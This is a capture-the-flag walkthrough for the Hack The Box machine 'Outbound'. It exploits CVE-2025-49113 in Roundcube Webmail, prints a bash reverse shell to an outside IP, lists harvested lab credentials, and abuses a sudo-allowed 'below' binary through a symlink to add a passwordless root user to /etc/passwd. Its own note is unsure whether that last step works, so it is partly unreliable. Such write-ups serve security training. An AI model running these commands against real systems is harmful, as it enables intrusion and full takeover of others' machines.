# Hack The Box: Outbound - Comprehensive Notes

**Target IP:** (Standard HTB IP range, e.g., 10.10.11.x)

**Domain:** outbound.htb

**Subdomain:** `mail.outbound.htb`
## 1. Scanning & Enumeration

### Network Scanning (Nmap)

**Open Ports:**

- `22/tcp` - SSH
    
- `80/tcp` - HTTP (Nginx 1.24.0)
    
**Scan Results:**

```
nmap -sCV mail.outbound.htb -p 80 --stats-every 5
# 80/tcp open  http    nginx 1.24.0 (Ubuntu)
# |_http-title: Roundcube Webmail :: Welcome to Roundcube Webmail
```

### Web Enumeration

Application: Roundcube Webmail

Version: 1.16.10

URL: http://mail.outbound.htb

**Vulnerability Assessment:**

- **Vulnerability:** **CVE-2025-49113** (Critical RCE in Roundcube Webmail).
    
- **Reference:** [OffSec Blog - CVE-2025-49113](https://www.offsec.com/blog/cve-2025-49113/ "null")
    
## 2. Exploitation (Initial Access)

### Credentials

We utilized valid credentials discovered during enumeration (or provided):

- **User:** `tyler`
    
- **Password:** `LhKL1o9Nm3X2`
    

### Exploit Execution (CVE-2025-49113)

We used a public exploit script to leverage the RCE vulnerability in Roundcube.

- **Exploit Script:** `CVE-2025-49113.php`
    
- **Payload:** Bash reverse shell.
    
```
# Command Structure
php CVE-2025-49113.php [http://mail.outbound.htb/](http://mail.outbound.htb/) tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/10.10.14.26/8080 0>&1'"
```

**Result:** Reverse shell established.

## 3. Lateral Movement

### Internal Enumeration

Inside the shell, we enumerated configuration files and databases.

- **Config File:** `/var/www/html/roundcube/config/config.inc.php`
    
- **Findings:** Database credentials found.
    
    - **DB User:** `roundcube`
        
    - **DB Password:** `RCDBPass2025`
        

### Accessing User 'Jacob'

Through further enumeration (likely database inspection or password reuse), we obtained credentials for the user `jacob`.

- **User:** `jacob`
    
- **Password:** `595mO8DmwGeD` (Plaintext) / `gY4Wr3a1evp4` (Reset)
    
- **Auth Secret:** `DpYqv6maI9HxDL5GhcCd8JaQQW`
    
- **Request Token:** `TIsOaABA1zHSXZOBpH6up5XFyayNRHaw`
    

## 4. Privilege Escalation (Root)

### Sudo Rights Analysis

Checking `sudo -l` for `jacob` revealed he can run the binary `below` as root without a password.

```
sudo -l
# User jacob may run the following commands on outbound:
#     (root) NOPASSWD: /usr/bin/below
```

### Exploit: Arbitrary File Write via Symlink Race Condition

The `below` binary is vulnerable to a symlink attack. It writes to a log file (`/var/log/below/error_root.log`) insecurely. By symlinking this log file to `/etc/passwd`, we can append a new root user.

**Exploit Steps:**

1. **Prepare Payload:** Create a string for a new root user (`pwn`) with no password.
    
    ```
    echo "pwn::0:0:pwn:/root:/bin/bash" > /tmp/fakepass
    ```
    
2. Race Condition:
    
    The exploit requires deleting the existing log, creating the symlink to /etc/passwd, running the binary, and then overwriting the log file content (which is now pointing to /etc/passwd) with our payload.
    

**Command Chain:**

```
echo "pwn::0:0:pwn:/root:/bin/bash" > /tmp/fakepass && \
rm -rf /var/log/below/error_root.log && \
ln -s /etc/passwd /var/log/below/error_root.log && \
sudo /usr/bin/below
```

_(Note: After running this, we copy the payload content to the target file immediately if the binary doesn't auto-write exactly what we want, but the notes suggest the binary writes to the linked file.)_

**Final Step (Switch User):**

Once /etc/passwd is modified:

```
su pwn
# Access granted as root
```

**Status:** Machine Completed.